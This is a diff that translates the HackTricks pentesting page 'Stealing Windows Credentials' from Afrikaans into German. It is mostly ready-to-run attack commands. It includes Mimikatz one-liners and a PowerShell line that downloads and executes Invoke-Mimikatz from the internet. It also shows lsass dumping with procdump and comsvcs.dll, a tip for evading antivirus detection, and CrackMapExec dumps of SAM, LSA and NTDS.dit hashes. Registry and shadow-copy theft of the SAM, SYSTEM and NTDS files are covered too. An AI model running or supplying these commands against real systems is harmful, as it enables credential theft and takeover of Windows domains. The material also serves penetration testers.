@@ -1,21 +1,21 @@
-# Stealing Windows Credentials
+# Stehlen von Windows-Anmeldeinformationen
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
-## Credentials Mimikatz
+## Anmeldeinformationen Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -29,7 +29,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Vind ander dinge wat Mimikatz kan doen in** [**hierdie bladsy**](credentials-mimikatz.md)**.**
+**Finde andere Dinge, die Mimikatz tun kann, auf** [**dieser Seite**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -37,11 +37,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Leer meer oor sommige moontlike beskermings van geloofsbriewe hier.**](credentials-protections.md) **Hierdie beskermings kan voorkom dat Mimikatz sekere geloofsbriewe onttrek.**
+[**Erfahren Sie hier mehr über mögliche Schutzmaßnahmen für Anmeldeinformationen.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten verhindern, dass Mimikatz einige Anmeldeinformationen extrahiert.**
 
-## Geloofsbriewe met Meterpreter
+## Anmeldeinformationen mit Meterpreter
 
-Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **te soek na wagwoorde en hashes** binne die slagoffer.
+Verwenden Sie das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um **nach Passwörtern und Hashes** im Opfer zu suchen.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -58,12 +58,12 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## Om AV te omseil
+## Umgehen von AV
 
 ### Procdump + Mimikatz
 
-Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n wettige Microsoft-gereedskap** is, word dit nie deur Defender opgespoor nie.\
-Jy kan hierdie gereedskap gebruik om die **lsass-proses te dump**, **die dump af te laai** en die **akkrediteeringe plaaslik** uit die dump te **onttrek**.
+Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es nicht von Defender erkannt.\
+Sie können dieses Tool verwenden, um den **lsass-Prozess zu dumpen**, den **Dump herunterzuladen** und die **Anmeldeinformationen lokal** aus dem Dump zu **extrahieren**.
 
 {% code title="Dump lsass" %}
 ```bash
@@ -75,7 +75,7 @@ Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 {% endcode %}
 
-{% code title="Onttrek kredensiale uit die dump" %}
+{% code title="Anmeldeinformationen aus dem Dump extrahieren" %}
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -84,46 +84,46 @@ mimikatz # sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-Hierdie proses word outomaties gedoen met [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Nota**: Sommige **AV** mag **ontdek** as **kwaadaardig** die gebruik van **procdump.exe om lsass.exe te dump**, dit is omdat hulle die string **"procdump.exe" en "lsass.exe"** **ontdek**. Dit is dus **stealthier** om die **PID** van lsass.exe as 'n **argument** aan procdump **oor te dra** in plaas van die **naam lsass.exe.**
+**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **bösartig** erkennen, da sie die Zeichenfolgen **"procdump.exe" und "lsass.exe"** erkennen. Es ist daher **unauffälliger**, die **PID** von lsass.exe als **Argument** an procdump **statt des Namens lsass.exe** zu übergeben.
 
-### Dumping lsass met **comsvcs.dll**
+### Dumpen von lsass mit **comsvcs.dll**
 
-'n DLL genaamd **comsvcs.dll** wat in `C:\Windows\System32` gevind word, is verantwoordelik vir **dumping prosesgeheue** in die geval van 'n ongeluk. Hierdie DLL sluit 'n **funksie** genaamd **`MiniDumpW`** in, wat ontwerp is om aangeroep te word met `rundll32.exe`.\
-Dit is irrelevant om die eerste twee argumente te gebruik, maar die derde een is in drie komponente verdeel. Die proses-ID wat gedump moet word, vorm die eerste komponent, die dump-lêer ligging verteenwoordig die tweede, en die derde komponent is streng die woord **vol**. Geen alternatiewe opsies bestaan nie.\
-Wanneer hierdie drie komponente ontleed word, word die DLL betrokke by die skep van die dump-lêer en die oordrag van die gespesifiseerde proses se geheue na hierdie lêer.\
-Die gebruik van die **comsvcs.dll** is haalbaar vir die dumping van die lsass-proses, wat die behoefte om procdump op te laai en uit te voer, uitskakel. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+Eine DLL namens **comsvcs.dll**, die sich in `C:\Windows\System32` befindet, ist verantwortlich für das **Dumpen des Prozessspeichers** im Falle eines Absturzes. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die dazu gedacht ist, mit `rundll32.exe` aufgerufen zu werden.\
+Es ist irrelevant, die ersten beiden Argumente zu verwenden, aber das dritte ist in drei Komponenten unterteilt. Die Prozess-ID, die gedumpt werden soll, stellt die erste Komponente dar, der Speicherort der Dump-Datei repräsentiert die zweite, und die dritte Komponente ist strikt das Wort **full**. Es gibt keine alternativen Optionen.\
+Nach der Analyse dieser drei Komponenten wird die DLL aktiviert, um die Dump-Datei zu erstellen und den Speicher des angegebenen Prozesses in diese Datei zu übertragen.\
+Die Nutzung von **comsvcs.dll** ist möglich, um den lsass-Prozess zu dumpen, wodurch die Notwendigkeit entfällt, procdump hochzuladen und auszuführen. Diese Methode wird ausführlich beschrieben unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
-Die volgende opdrag word gebruik vir uitvoering:
+Der folgende Befehl wird zur Ausführung verwendet:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
+**Sie können diesen Prozess mit** [**lssasy**](https://github.com/Hackndo/lsassy)** automatisieren.**
 
-### **Dumping lsass met Taakbestuurder**
+### **Dumping lsass mit dem Task-Manager**
 
-1. Regsklik op die Taakbalk en klik op Taakbestuurder
-2. Klik op Meer besonderhede
-3. Soek vir "Plaaslike Sekuriteitsowerheid Proses" proses in die Prosesse-oortjie
-4. Regsklik op "Plaaslike Sekuriteitsowerheid Proses" proses en klik op "Skep dump-lêer".
+1. Klicken Sie mit der rechten Maustaste auf die Taskleiste und wählen Sie den Task-Manager aus.
+2. Klicken Sie auf Weitere Details.
+3. Suchen Sie im Tab Prozesse nach dem Prozess "Local Security Authority Process".
+4. Klicken Sie mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und wählen Sie "Dump-Datei erstellen".
 
-### Dumping lsass met procdump
+### Dumping lsass mit procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-ondertekende binêre wat 'n deel is van [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei, die Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) Suite ist.
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Dumpin lsass met PPLBlade
+## Dumpin lsass mit PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is 'n Gekapte Proses Dumper Tool wat ondersteuning bied vir die obfuskering van geheue-dump en die oordrag daarvan na afstandswerkstasies sonder om dit op die skyf te laat val.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Tool zum Dumpen geschützter Prozesse, das das Obfuskieren von Speicherdumps unterstützt und diese auf entfernte Arbeitsstationen überträgt, ohne sie auf der Festplatte abzulegen.
 
-**Belangrike funksies**:
+**Hauptfunktionen**:
 
-1. Omseiling van PPL-beskerming
-2. Obfuskering van geheue-dump lêers om Defender se handtekening-gebaseerde opsporingsmeganismes te ontwyk
-3. Oplaai van geheue-dump met RAW en SMB oplaai metodes sonder om dit op die skyf te laat val (fileless dump)
+1. Umgehung des PPL-Schutzes
+2. Obfuskierung von Speicherdump-Dateien, um Mechanismen zur signaturbasierten Erkennung durch Defender zu umgehen
+3. Hochladen von Speicherdumps mit RAW- und SMB-Upload-Methoden, ohne sie auf der Festplatte abzulegen (fileless dump)
 
 {% code overflow="wrap" %}
 ```bash
@@ -133,51 +133,51 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 
 ## CrackMapExec
 
-### Dump SAM hashes
+### SAM-Hashes dumpen
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Dump LSA geheime
+### LSA-Geheimnisse dumpen
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Dump die NTDS.dit van teiken DC
+### Dumpen Sie die NTDS.dit vom Ziel-DC
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Dump die NTDS.dit wagwoordgeskiedenis van die teiken DC
+### Dumpen Sie die NTDS.dit Passwort-Historie vom Ziel-DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### Wys die pwdLastSet attribuut vir elke NTDS.dit rekening
+### Zeige das Attribut pwdLastSet für jedes NTDS.dit-Konto an
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
 ## Stealing SAM & SYSTEM
 
-Hierdie lêers behoort **geleë** te wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan dit nie net op 'n gewone manier kopieer nie** omdat hulle beskerm is.
+Diese Dateien sollten sich **befinden** in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM._ Aber **du kannst sie nicht einfach auf reguläre Weise kopieren**, da sie geschützt sind.
 
 ### From Registry
 
-Die maklikste manier om daardie lêers te steel, is om 'n kopie van die register te kry:
+Der einfachste Weg, diese Dateien zu stehlen, besteht darin, eine Kopie aus der Registrierung zu erhalten:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Laai** daardie lêers na jou Kali masjien en **onttrek die hashes** met:
+**Lade** diese Dateien auf deine Kali-Maschine herunter und **extrahiere die Hashes** mit:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 ### Volume Shadow Copy
 
-Jy kan 'n kopie van beskermde lêers maak met behulp van hierdie diens. Jy moet 'n Administrateur wees.
+Sie können geschützte Dateien mit diesem Dienst kopieren. Sie müssen Administrator sein.
 
-#### Gebruik vssadmin
+#### Verwendung von vssadmin
 
-Die vssadmin-binary is slegs beskikbaar in Windows Server weergawes
+Die vssadmin-Binärdatei ist nur in Windows Server-Versionen verfügbar.
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -190,7 +190,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Maar jy kan dieselfde doen vanaf **Powershell**. Dit is 'n voorbeeld van **hoe om die SAM-lêer te kopieer** (die hardeskyf wat gebruik word is "C:" en dit word gestoor in C:\users\Public) maar jy kan dit gebruik om enige beskermde lêer te kopieer:
+Aber Sie können dasselbe von **Powershell** aus tun. Dies ist ein Beispiel für **wie man die SAM-Datei kopiert** (die verwendete Festplatte ist "C:" und sie wird in C:\users\Public gespeichert), aber Sie können dies verwenden, um jede geschützte Datei zu kopieren:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -201,86 +201,86 @@ $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
 ### Invoke-NinjaCopy
 
-Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie van SAM, SYSTEM en ntds.dit te maak.
+Schließlich könnten Sie auch das [**PS-Skript Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Active Directory Kredensiale - NTDS.dit**
+## **Active Directory-Anmeldeinformationen - NTDS.dit**
 
-Die **NTDS.dit** lêer is bekend as die hart van **Active Directory**, wat belangrike data oor gebruikersobjekte, groepe en hul lidmaatskap bevat. Dit is waar die **wagwoord hashes** vir domein gebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)** databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.
+Die **NTDS.dit**-Datei ist als das Herz von **Active Directory** bekannt und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. Hier werden die **Passworthashes** für Domänenbenutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.
 
-Binne hierdie databasis word drie primêre tabelle gehandhaaf:
+Innerhalb dieser Datenbank werden drei Haupttabellen verwaltet:
 
-- **Data Tabel**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objektes soos gebruikers en groepe.
-- **Link Tabel**: Dit hou die verhouding, soos groep lidmaatskappe, dop.
-- **SD Tabel**: **Sekuriteitsbeskrywings** vir elke objek word hier gehou, wat die sekuriteit en toegangbeheer vir die gestoor objektes verseker.
+- **Datentabelle**: Diese Tabelle ist dafür zuständig, Details über Objekte wie Benutzer und Gruppen zu speichern.
+- **Verknüpfungstabelle**: Sie verfolgt Beziehungen, wie z.B. Gruppenmitgliedschaften.
+- **SD-Tabelle**: **Sicherheitsbeschreibungen** für jedes Objekt werden hier gehalten, um die Sicherheit und den Zugriff auf die gespeicherten Objekte zu gewährleisten.
 
-Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+Weitere Informationen dazu: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur _lsass.exe_ gebruik. Dan kan **gedeelte** van die **NTDS.dit** lêer **binne die `lsass`** geheue geleë wees (jy kan die nuutste toeganklike data vind waarskynlik as gevolg van die prestasie verbetering deur 'n **cache** te gebruik).
+Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ verwendet. Ein **Teil** der **NTDS.dit**-Datei könnte **im `lsass`**-Speicher gefunden werden (die zuletzt abgerufenen Daten können wahrscheinlich aufgrund der Leistungsverbesserung durch die Verwendung eines **Caches** gefunden werden).
 
-#### Ontsleuteling van die hashes binne NTDS.dit
+#### Entschlüsselung der Hashes in NTDS.dit
 
-Die hash is 3 keer versleuteld:
+Der Hash wird dreimal verschlüsselt:
 
-1. Ontsleutel Wagwoord Versleuteling Sleutel (**PEK**) met die **BOOTKEY** en **RC4**.
-2. Ontsleutel die **hash** met **PEK** en **RC4**.
-3. Ontsleutel die **hash** met **DES**.
+1. Entschlüsseln des Passwortverschlüsselungsschlüssels (**PEK**) mit dem **BOOTKEY** und **RC4**.
+2. Entschlüsseln des **Hashes** mit **PEK** und **RC4**.
+3. Entschlüsseln des **Hashes** mit **DES**.
 
-**PEK** het die **selfde waarde** in **elke domeinbeheerder**, maar dit is **versleuteld** binne die **NTDS.dit** lêer met die **BOOTKEY** van die **SISTEEM lêer van die domeinbeheerder (is verskillend tussen domeinbeheerders)**. Dit is hoekom jy die kredensiale van die NTDS.dit lêer moet kry **jy het die lêers NTDS.dit en SISTEEM nodig** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** hat den **gleichen Wert** in **jedem Domänencontroller**, wird jedoch **verschlüsselt** in der **NTDS.dit**-Datei unter Verwendung des **BOOTKEY** der **SYSTEM-Datei des Domänencontrollers (unterscheidet sich zwischen Domänencontrollern)**. Aus diesem Grund müssen Sie, um die Anmeldeinformationen aus der NTDS.dit-Datei zu erhalten, **die Dateien NTDS.dit und SYSTEM** (_C:\Windows\System32\config\SYSTEM_) haben.
 
-### Kopieer NTDS.dit met Ntdsutil
+### Kopieren von NTDS.dit mit Ntdsutil
 
-Beskikbaar sedert Windows Server 2008.
+Verfügbar seit Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-You could also use the [**volume shadow copy**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).
+Du könntest auch den [**Volume Shadow Copy**](./#stealing-sam-and-system) Trick verwenden, um die **ntds.dit** Datei zu kopieren. Denk daran, dass du auch eine Kopie der **SYSTEM Datei** benötigst (nochmals, [**dump sie aus der Registry oder verwende den Volume Shadow Copy**](./#stealing-sam-and-system) Trick).
 
-### **Onthou van hashes uit NTDS.dit**
+### **Hashes aus NTDS.dit extrahieren**
 
-Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
+Sobald du die Dateien **NTDS.dit** und **SYSTEM** **erhalten** hast, kannst du Tools wie _secretsdump.py_ verwenden, um die **Hashes** zu **extrahieren**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-U kan dit ook **outomaties onttrek** met 'n geldige domein admin gebruiker:
+Du kannst sie auch **automatisch extrahieren**, indem du einen gültigen Domain-Admin-Benutzer verwendest:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-Vir **groot NTDS.dit lêers** word dit aanbeveel om dit te onttrek met [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Für **große NTDS.dit-Dateien** wird empfohlen, sie mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.
 
-Laastens kan jy ook die **metasploit module** gebruik: _post/windows/gather/credentials/domain\_hashdump_ of **mimikatz** `lsadump::lsa /inject`
+Schließlich können Sie auch das **metasploit-Modul** verwenden: _post/windows/gather/credentials/domain\_hashdump_ oder **mimikatz** `lsadump::lsa /inject`
 
-### **Onttrekking van domeinobjekte uit NTDS.dit na 'n SQLite-databasis**
+### **Extrahieren von Domänenobjekten aus NTDS.dit in eine SQLite-Datenbank**
 
-NTDS-objekte kan na 'n SQLite-databasis onttrek word met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie net word geheime onttrek nie, maar ook die hele objekte en hul eienskappe vir verdere inligtingonttrekking wanneer die rou NTDS.dit-lêer reeds verkry is.
+NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Es werden nicht nur Geheimnisse extrahiert, sondern auch die gesamten Objekte und deren Attribute für weitere Informationsbeschaffung, wenn die rohe NTDS.dit-Datei bereits abgerufen wurde.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Die `SYSTEM` hive is opsioneel maar laat toe vir die ontsleuteling van geheime (NT & LM hashes, aanvullende akrediteerbare soos duidelike teks wagwoorde, kerberos of vertrou sleutels, NT & LM wagwoord geskiedenisse). Saam met ander inligting, word die volgende data onttrek: gebruiker en masjien rekeninge met hul hashes, UAC vlae, tydstempel vir laaste aanmelding en wagwoord verandering, rekening beskrywing, name, UPN, SPN, groepe en rekursiewe lede, organisatoriese eenhede boom en lidmaatskap, vertroude domeine met vertroue tipe, rigting en eienskappe...
+Der `SYSTEM`-Hive ist optional, ermöglicht jedoch die Entschlüsselung von Geheimnissen (NT- und LM-Hashes, zusätzliche Anmeldeinformationen wie Klartextpasswörter, Kerberos- oder Vertrauensschlüssel, NT- und LM-Passworthistorien). Neben anderen Informationen werden die folgenden Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel für die letzte Anmeldung und Passwortänderung, Kontobeschreibung, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, organisatorische Einheitensystem und Mitgliedschaft, vertrauenswürdige Domänen mit Vertrauensart, Richtung und Attributen...
 
 ## Lazagne
 
-Laai die binêre van [hier](https://github.com/AlessandroZ/LaZagne/releases) af. Jy kan hierdie binêre gebruik om akrediteerbare uit verskeie sagteware te onttrek.
+Laden Sie die Binärdatei [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Sie können diese Binärdatei verwenden, um Anmeldeinformationen aus mehreren Softwareanwendungen zu extrahieren.
 ```
 lazagne.exe all
 ```
-## Ander gereedskap om kredensiale uit SAM en LSASS te onttrek
+## Andere Werkzeuge zum Extrahieren von Anmeldeinformationen aus SAM und LSASS
 
-### Windows credentials Editor (WCE)
+### Windows Credentials Editor (WCE)
 
-Hierdie gereedskap kan gebruik word om kredensiale uit die geheue te onttrek. Laai dit af van: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Dieses Tool kann verwendet werden, um Anmeldeinformationen aus dem Speicher zu extrahieren. Laden Sie es herunter von: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Onttrek kredensiale uit die SAM-lêer
+Extrahieren Sie Anmeldeinformationen aus der SAM-Datei.
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
 ### PwDump
 
-Onttrek geloofsbriewe uit die SAM-lêer
+Extrahieren Sie Anmeldeinformationen aus der SAM-Datei
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -288,23 +288,23 @@ type outpwdump
 ```
 ### PwDump7
 
-Laai dit af van: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) en **voer dit net uit** en die wagwoorde sal onttrek word.
+Laden Sie es herunter von: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) und **führen Sie es einfach aus**, und die Passwörter werden extrahiert.
 
-## Verdedigings
+## Abwehrmaßnahmen
 
-[**Leer hier oor sommige kredensiaal beskermings.**](credentials-protections.md)
+[**Erfahren Sie hier mehr über einige Schutzmaßnahmen für Anmeldeinformationen.**](credentials-protections.md)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
